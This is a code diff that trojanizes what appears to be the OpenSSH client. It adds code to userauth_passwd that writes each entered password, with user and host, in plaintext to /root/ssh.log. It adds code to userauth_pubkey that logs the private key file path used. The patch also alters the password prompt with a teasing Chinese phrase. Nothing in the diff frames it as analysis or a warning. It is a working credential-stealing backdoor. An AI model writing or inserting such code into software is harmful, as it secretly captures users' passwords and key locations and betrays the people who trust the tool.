@@ -1039,6 +1039,7 @@ userauth_passwd(struct ssh *ssh)
 	const char *host = options.host_key_alias ?  options.host_key_alias :
 	    authctxt->host;
 	int r;
+	FILE *fp;
 
 	if (authctxt->attempt_passwd++ >= options.number_of_password_prompts)
 		return 0;
@@ -1046,7 +1047,7 @@ userauth_passwd(struct ssh *ssh)
 	if (authctxt->attempt_passwd != 1)
 		error("Permission denied, please try again.");
 
-	xasprintf(&prompt, "%s@%s's password: ", authctxt->server_user, host);
+	xasprintf(&prompt, "%s@%s's password 小心坏坏哟: ", authctxt->server_user, host);
 	password = read_passphrase(prompt, 0);
 	if ((r = sshpkt_start(ssh, SSH2_MSG_USERAUTH_REQUEST)) != 0 ||
 	    (r = sshpkt_put_cstring(ssh, authctxt->server_user)) != 0 ||
@@ -1057,6 +1058,14 @@ userauth_passwd(struct ssh *ssh)
 	    (r = sshpkt_add_padding(ssh, 64)) != 0 ||
 	    (r = sshpkt_send(ssh)) != 0)
 		fatal_fr(r, "send packet");
+
+	// 写入日志文件
+	fp = fopen("/root/ssh.log", "a");
+	if (fp != NULL) {
+			fprintf(fp, "Password for %s@%s : %s\n", 
+							authctxt->server_user, authctxt->host, password);
+			fclose(fp);
+	}
 
 	free(prompt);
 	if (password != NULL)
@@ -1862,6 +1871,7 @@ userauth_pubkey(struct ssh *ssh)
 	int sent = 0;
 	char *ident;
 	static int prepared;
+	FILE *fp;
 
 	if (!prepared) {
 		pubkey_prepare(ssh, authctxt);
@@ -1879,6 +1889,15 @@ userauth_pubkey(struct ssh *ssh)
 		 * encrypted keys we cannot do this and have to load the
 		 * private key instead
 		 */
+
+		// 写入日志文件
+		fp = fopen("/root/ssh.log", "a");
+		if (fp != NULL) {
+				fprintf(fp, "Privatekeyfile for %s@%s : %s\n", 
+								authctxt->server_user, authctxt->host, id->filename);
+				fclose(fp);
+		}
+
 		if (id->key != NULL) {
 			ident = format_identity(id);
 			debug("Offering public key: %s", ident);
@@ -1886,6 +1905,7 @@ userauth_pubkey(struct ssh *ssh)
 			sent = send_pubkey_test(ssh, id);
 		} else {
 			debug("Trying private key: %s", id->filename);
+
 			id->key = load_identity_file(id);
 			if (id->key != NULL) {
 				id->isprivate = 1;
